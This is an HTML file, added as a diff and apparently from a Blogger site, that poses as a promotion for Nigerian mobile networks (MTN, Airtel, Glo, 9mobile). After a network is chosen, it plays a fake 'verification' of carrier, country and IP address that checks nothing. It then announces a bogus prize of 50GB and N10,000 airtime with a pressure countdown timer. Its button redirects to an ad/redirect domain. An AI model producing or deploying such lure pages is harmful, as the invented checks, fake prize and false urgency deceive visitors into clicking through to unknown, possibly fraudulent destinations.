@@ -1,0 +1,334 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Select Your Network</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #f7f7f7, #e0f7fa);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Screen wrapper */
+    .screen {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background: #007BFF;
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 420px;
+      color: white;
+    }
+    .active { display: block; }
+
+    /* First screen grid layout */
+    #networkScreen h2 {
+      font-size: 28px;
+      margin-bottom: 25px;
+      color: #fff;
+    }
+    .network-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+    }
+
+    /* Square card design */
+    .network-option {
+      background: white;
+      border-radius: 15px;
+      padding: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      height: 120px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+    }
+    .network-option:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 16px rgba(0,0,0,0.2);
+    }
+
+    /* Logo styling */
+    .network-option img {
+      width: 50px;
+      height: 50px;
+      object-fit: contain;
+      margin-bottom: 8px;
+    }
+    .network-option span {
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    /* Network-specific border colors */
+    .mtn { border: 2px solid #ffcc00; }
+    .airtel { border: 2px solid #e60000; }
+    .glo { border: 2px solid #009900; }
+    .nine { border: 2px solid #000; }
+
+    /* Improved verification screen */
+    #verificationScreen h2 {
+      font-size: 24px;
+      margin-bottom: 25px;
+      color: #fff;
+    }
+
+    /* Animated circular loader */
+    .circle-loader {
+      width: 80px;
+      height: 80px;
+      border: 6px solid rgba(255,255,255,0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 1.2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Progress steps */
+    .progress-steps {
+      text-align: left;
+      margin-top: 15px;
+    }
+    .progress-step {
+      font-size: 16px;
+      padding: 10px;
+      margin-bottom: 8px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: white;
+      opacity: 0.6;
+      transition: all 0.4s ease;
+    }
+    .progress-step.active {
+      background: rgba(255,255,255,0.25);
+      opacity: 1;
+      font-weight: bold;
+    }
+    .progress-step.done {
+      background: rgba(0,255,0,0.15);
+      color: #00ff00;
+      font-weight: bold;
+    }
+
+    /* Checkmark animation */
+    .checkmark {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: inline-block;
+      border: 2px solid #00ff00;
+      position: relative;
+      animation: pop 0.3s ease forwards;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0.3); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .checkmark::after {
+      content: "";
+      position: absolute;
+      left: 5px;
+      top: 1px;
+      width: 5px;
+      height: 10px;
+      border: solid #00ff00;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    /* Final Overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      z-index: 999;
+      color: white;
+      flex-direction: column;
+    }
+    .overlay h2 {
+      font-size: 24px;
+      margin-bottom: 15px;
+      color: #ffdd99;
+    }
+    .overlay p { color: white; }
+
+    .overlay .popup-box {
+      background: #006ae0;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 90%;
+      box-shadow: 0 0 25px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .claim-button {
+      margin-top: 25px;
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #ff9900;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(255,153,0,0.4);
+      transition: background 0.3s ease;
+    }
+    .claim-button:hover { background: #e68a00; }
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/16608323001025005589" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+  <!-- First Screen: Network Selection -->
+  <div class="screen active" id="networkScreen">
+    <h2>Select Your Network</h2>
+    <div class="network-grid">
+      <div class="network-option mtn" onclick="handleNetworkSelection()">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpV4AhyImD49W1A8ORYFeENQhyXtih6HckvD_VT5rhgqFgK9tftMlzoDIPfwIgIJ3IeIQuo_t36rOjXSPUUQvpd-e1bS5SO0r4Wi-tFd3Tm1AgW3TwH_wgdpivkXHBL4A5fhGyp0bSB0UkgdHavg_o1nDlcnyLDkFMV8imLKlrMnjWzkNSLv2Xt69SAME/s1600/photo_2025-06-11_19-01-17.jpg" alt="MTN Logo">
+        <span>MTN</span>
+      </div>
+
+      <div class="network-option airtel" onclick="handleNetworkSelection()">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5BYreGEokPpbp3CH923YXQDRLoi9XpHrXOIu5G9eT-oogoNzPq0z5zJQrYofG3TyMJ99yZJlhGrBiRjckxqSUvt3iifMicPyTAHlLV4ocYvRYKVJVCBaxdmad1iI1RP_dw35M5mhm26M0ObA9FnX2YaNTl68t3-8V0yigIGTZPeHaFTjo_eixR3vJx8w/s1600/photo_2025-06-11_19-01-29.jpg" alt="Airtel Logo">
+        <span>Airtel</span>
+      </div>
+
+      <div class="network-option glo" onclick="handleNetworkSelection()">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYg134E_ZA3_GBLPr8yMmkHDrRDT_Cp-lKbNnU-A2FdDC67EyijKEFh5PysbeDGWLWbBqNJdi0g-9NTtfJ7YPedMnTItO1m20hZVp_zMeUU8f_fbBcf-TsYFEh9j7bStzkGtEH7_hb8SU8HTfE619FpQo16etReYy3dWGPxjuYi_OKMbQg9OiQf3UuDlc/s1600/photo_2025-06-11_19-01-26.jpg" alt="Glo Logo">
+        <span>Glo</span>
+      </div>
+
+      <div class="network-option nine" onclick="handleNetworkSelection()">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_dkC4KFlm0v10qJNacbZGy5qMDSqhbHbDCjNr3myk00DV1WtOEfiidaGIxCLFBLhXvWrMv1Ego74rrDyRl2j39p-2s4kHqPiXwvnZ-JlPLgyPzIh1VWa1qvbUbHsZh5SaMWeyxMsOTf-tAecsZ_pXykPI2b4e_nARwlacKbjNWp-ua3ZYnSdB4zoizHM/s1600/photo_2025-06-11_19-01-38.jpg" alt="9mobile Logo">
+        <span>9mobile</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Second Screen: Verification -->
+  <div class="screen" id="verificationScreen">
+    <h2>Verifying Your Connection...</h2>
+    <div class="circle-loader"></div>
+    <div class="progress-steps">
+      <div class="progress-step active" id="step1">Verifying Network Carrier</div>
+      <div class="progress-step" id="step2">Checking Country</div>
+      <div class="progress-step" id="step3">Checking IP Address</div>
+    </div>
+  </div>
+
+  <!-- Final Overlay -->
+  <div class="overlay" id="congratsOverlay">
+    <div class="popup-box">
+      <h2>🎉 Congratulations!</h2>
+      <p style="font-size: 20px; font-weight: bold;">You are qualified for this promo</p>
+      <p>You will receive additional bonus of 50GB + N10,000 Airtime when you subscribe</p>
+      <button class="claim-button" id="claimBtn" onclick="startRedirect()">SUBSCRIBE NOW</button>
+      <p id="countdownText" style="margin-top: 10px; font-size: 16px;">Claim Promo in (2:59)</p>
+    </div>
+  </div>
+
+  <script>
+    // Countdown timer
+    let totalSeconds = 179;
+    const countdownText = document.getElementById('countdownText');
+
+    function formatTime(seconds) {
+      const mins = Math.floor(seconds / 60);
+      const secs = seconds % 60;
+      return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+    }
+
+    function updateCountdown() {
+      countdownText.textContent = `Claim Promo in (${formatTime(totalSeconds)})`;
+      if (totalSeconds > 0) {
+        totalSeconds--;
+        setTimeout(updateCountdown, 1000);
+      }
+    }
+    updateCountdown();
+
+    // Network Selection
+    function handleNetworkSelection() {
+      goToVerification();
+    }
+
+    // Animate verification
+    function goToVerification() {
+      document.getElementById('networkScreen').classList.remove('active');
+      document.getElementById('verificationScreen').classList.add('active');
+
+      const steps = [
+        { id: 'step1', delay: 1000 },
+        { id: 'step2', delay: 3000 },
+        { id: 'step3', delay: 5000 }
+      ];
+
+      steps.forEach((step, index) => {
+        setTimeout(() => {
+          const stepElement = document.getElementById(step.id);
+          stepElement.classList.add('done');
+
+          // Add checkmark
+          stepElement.innerHTML += `<span class="checkmark"></span>`;
+
+          if (steps[index + 1]) {
+            document.getElementById(steps[index + 1].id).classList.add('active');
+          }
+
+          // Final step leads to overlay
+          if (index === steps.length - 1) {
+            setTimeout(() => {
+              document.getElementById('verificationScreen').classList.remove('active');
+              document.getElementById('congratsOverlay').style.display = 'flex';
+            }, 1000);
+          }
+        }, step.delay);
+      });
+    }
+
+    // Redirect
+    function startRedirect() {
+      const btn = document.getElementById('claimBtn');
+      btn.disabled = true;
+      btn.innerHTML = `Loading... <span style="display:inline-block;width:16px;height:16px;border:3px solid #fff;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-left:8px;"></span>`;
+      setTimeout(() => {
+        window.location.href = 'http://ak.stikroltiltoowi.net/4/9039697';
+      }, 500);
+    }
+  </script>
+
+</body>
+</html>
